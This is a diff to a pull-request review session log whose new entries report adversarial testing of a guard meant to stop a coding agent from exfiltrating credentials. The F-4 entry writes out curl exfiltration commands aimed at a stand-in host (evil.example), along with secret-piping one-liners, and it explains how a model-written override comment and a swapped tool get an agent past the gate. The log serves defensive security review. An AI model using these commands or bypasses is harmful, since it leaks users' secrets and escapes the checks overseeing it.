@@ -12,8 +12,8 @@ topic: pr-review
 
 # Session Log — PR Review
 
-> Two-sided observation log for the "review open PRs" work stream (PRs #7
-> and #8 against `experiments`). Captures frictions (F-N) and wins (W-N)
+> Two-sided observation log for the "review open PRs" work stream (PRs #7,
+> #8, and #9 against `experiments`). Captures frictions (F-N) and wins (W-N)
 > from reconnaissance performed while reviewing.
 
 ---
@@ -25,6 +25,7 @@ topic: pr-review
 | F-1 | 2026-07-20 | low | plan-prose | open | PR #7 cites a bug file that doesn't exist anywhere in the repo |
 | F-2 | 2026-07-20 | high | plan-prose | open | PR #8's description covers ~4 items; diff silently includes a 627-line indexer.rs rewrite + 2 more undisclosed fixes |
 | F-3 | 2026-07-20 | med | codescout-tool | fixed-verified | Initial PR #7 review declared "no blocking correctness issues"; independent clippy run found one |
+| F-4 | 2026-08-07 | high | plan-prose | open | PR #9 discloses two narrow limitations; 10 of 11 adversarial variants bypass the control, none of them via a disclosed route |
 
 ## Wins Index
 
@@ -32,6 +33,7 @@ topic: pr-review
 |----|------|-------:|---------|----------------|--------|
 | W-1 | 2026-07-20 | high | Diff PR's claimed file list against `gh`'s actual file list before reading hunks | Would likely have missed or badly delayed the scope-mismatch finding (F-2) by reading hunks in file order instead | validated |
 | W-2 | 2026-07-20 | high | Independent fmt/clippy/test run in an isolated worktree, not trusting PR self-reports | Would have pushed a broken `clippy -D warnings` gate onto `experiments` | validated |
+| W-3 | 2026-08-07 | high | Execute a newly-added security control against adversarial inputs instead of reading its patterns | Would have shipped ~2 confident findings and hedged the rest, deferring to the PR's own stated scope | validated |
 
 ---
 
@@ -143,6 +145,59 @@ Status columns used above (`open`, `mitigated`, `fixed-verified`,
 **Impact:** high — prevented landing a broken lint gate on the shared integration branch.
 
 **Promote-when:** A second PR-merge session where independent fmt/clippy/test verification (not trusting the PR body) catches a real gap. At 2 datapoints, promote to this project's RELEASE.md / Standard Ship Sequence as a required step for any multi-PR merge, not just cherry-picks to `master`.
+
+**Status:** validated
+
+---
+## F-4 — PR #9's "honest limitations" disclose two narrow gaps; 10 of 11 adversarial variants bypass the control, none via a disclosed route
+
+**Observed:** 2026-08-07, reviewing PR #9 (`feat/pi-secret-guard`) — `contrib/pi/secret-guard.ts`, a hard gate meant to block credential exfiltration through shell egress.
+
+**When:** After reading the extension's source and running its 12-case suite (12/12 passing), before writing the review up.
+
+**Expected:** The PR is unusually well-disclosed — it ships a "Scope (honest limitations)" paragraph in both the module docstring and the README, naming what is out of scope: "exfiltration through a legitimately allowed host, or obfuscated encodings of the secret." That framing implies the undisclosed cases are covered.
+
+**Got:** An adversarial probe driving the extension's own `tool_call` handler (same fixture setup as the PR's suite) allowed **10 of 11 exfiltration variants** and blocked 2 benign local commands. None of the 10 route through an allowlisted host and none obfuscate the secret — i.e. none fall under either disclosed limitation:
+
+- **URL userinfo confusion.** `SCHEMED_HOST = /https?:\/\/([A-Za-z0-9.-]+)/` stops at `@`, so it reports the *username* as the host. `curl "https://github.com@evil.example/?k=$KEY"` presents an allowlisted name to the guard while curl connects to `evil.example`.
+- **`mentionsAllowed` is a disjunctive escape.** The block condition is `badHosts.length > 0 || !mentionsAllowed`, where `mentionsAllowed` is `allowedHosts.some(h => command.includes(h))` over the whole command string. Because it is OR'd in as an escape it can only ever convert a block into an allow — it never adds protection. A scheme-less destination (`curl evil.example/c`, which curl accepts) plus the literal string `localhost` anywhere — a comment, a `-A` flag, an earlier chained command — walks through.
+- **The secret need not appear in the command.** `env | curl …` and `cat ~/.pi/agent/models.json | curl …` fail both trigger tests (no literal secret, no `*KEY|TOKEN|SECRET*` token), so the guard returns early at `secret-guard.ts:123-125`. The second exfiltrates the exact file the guard harvests its own secrets from.
+- **The override is model-emitted.** `# secret-guard-override` is tested against the command string the model writes. The PR's own premise is that AGENTS.md rules are soft *because they live in the model's context and can be talked around by injected content* — the override lives there too, so the hard gate's bypass is enforced only by the soft guard it was built to replace. The `# codescout-override` convention it mirrors gates a tool-preference nudge, where the cost of bypass is `cat` instead of `read_file`.
+- **Tool substitution.** The handler filters `event.toolName !== "bash"`, but `contrib/pi/mcp.json.example` (same directory) registers codescout's `run_command` as a directTool, and codescout's own `is_dangerous_command` (`src/util/path_security.rs:539`) matches only destructive patterns (`rm -rf`, `dd`, `mkfs`, `git push --force`) — no egress. Identical payload, ungated end to end, against the very keys that file holds.
+
+Plus 2 false positives: `EGRESS` matches `\bnc\b` and `\bssh\b` as bare words, so `grep -nc "API_KEY" .env` and `grep API_KEY ~/.ssh/config` are both blocked as network egress.
+
+**Probable cause:** The control decides safety by regex over the command *as text*, while what determines where bytes go is curl's URL parser and the shell. Every gap between the two is a bypass. The suite has exactly one payload shape per mechanism and no adversarial variants, so nothing in the PR's own verification could surface the class; the limitations paragraph was written from the author's model of the design rather than from an attempt to break it.
+
+**Notable — a vacuous test hid the largest gap.** The suite's `"allow: non-bash tool calls are ignored"` case returns `undefined` without ever invoking `handlers.tool_call` (`tests/test-secret-guard.mjs:69-71`), so it cannot fail. It reads as coverage of the tool surface while proving nothing — and encodes the tool-substitution gap as *intended* behavior.
+
+**Notable — the repo already wrote this lesson down.** `contrib/pi/codescout-mode.ts:13-17` carries the pi-integration F-3 post-mortem: MCP tools register *prefixed* (`codescout_run_command`, not `run_command`), and an earlier revision that assumed unprefixed names "silently no-op'd every session — native edit/write/read/bash were never blocked." `secret-guard.ts` hardcodes one unprefixed tool name in the same directory and inherits the same class of failure.
+
+**Workaround:** Wrote an adversarial probe (see W-3) rather than reasoning about the regexes; reported every finding on the PR with the reproduction output attached. Recommended inverting the trigger to "any egress utility → every *parsed* destination must be allowlisted, fail closed," which closes the host-detection and secret-detection classes together without the control needing to recognize a secret at all.
+
+**Severity:** high — a reviewer trusting the PR body's unusually candid disclosure would merge a security control that fails against its own stated threat model. The failure mode is worse than no control: `contrib/pi/AGENTS.md` is amended in the same PR to tell the agent the gate exists, which invites relying on it.
+
+**Status:** open — reported on PR #9, not yet fixed.
+
+**Fix idea / Pointer:** PR #9 (`github.com/mareurs/codescout/pull/9`). Ordering matters: fix the false positives *before* hardening the override, or the extension becomes annoying enough to uninstall — and habitual overriding is itself the bypass. The probe cases are reproducible and would drop into `contrib/pi/tests/test-secret-guard.mjs` nearly as-is, giving each fix a failing test to turn green.
+
+---
+
+## W-3 — Executing a security control against adversarial inputs (not reading its patterns) turned "probably has gaps" into 10 reproduced bypasses
+
+**Observed:** 2026-08-07, reviewing PR #9 (`feat/pi-secret-guard`).
+
+**Pattern:** When a PR adds a security or policy control — a guard, validator, allowlist, sanitizer — do not review it by reading its patterns. Stand up its own test fixture, import the module, and drive its decision function with a list of adversarial inputs, one per hypothesis, **plus a control case that must still trigger**. Report the run output rather than the reasoning. The control case is what distinguishes "the guard has holes" from "my harness isn't wired up."
+
+**Counterfactual:** Reading `secret-guard.ts`'s five regexes produced roughly six bypass hypotheses. Source-reading alone would plausibly have shipped two of them as confident findings and hedged or dropped the rest — several (`env | curl`, `cat models.json | curl`, chained scheme-less egress) *look* at a glance like they might fall under the PR's disclosed "not a sandbox" limitation, and the pull is to defer to a stated scope rather than test it. Executing removed the ambiguity: 10 confirmed bypasses, 2 confirmed false positives, one control case blocking correctly. The single most important structural finding — tool substitution via `run_command` — only became concrete after checking what the sibling `mcp.json.example` actually registers and confirming codescout's `is_dangerous_command` carries no egress patterns; that is a three-file chain no amount of staring at the regexes would have produced.
+
+**Confirming data points:**
+1. This session, PR #9 — 10 bypasses + 2 false positives reproduced in a single probe run, against code whose own 12-case suite passed 12/12.
+2. Pending — a second PR adding a guard/validator where execution surfaces a gap that source-reading rationalized away.
+
+**Impact:** high — the difference between "this control has some gaps" (soft, arguable, easy for an author to wave off) and a paste-able run log naming the exact commands that walk through it.
+
+**Promote-when:** A second PR review where executing a newly-added control against adversarial inputs surfaces a bypass that reading it did not. At 2 datapoints, promote to CLAUDE.md / the review skill as a required step for any PR adding a security or policy control. Sibling to W-2 ("independently run the gate, don't trust PR self-reports") — both are the same law: **execute the thing, don't infer from its description.**
 
 **Status:** validated
 
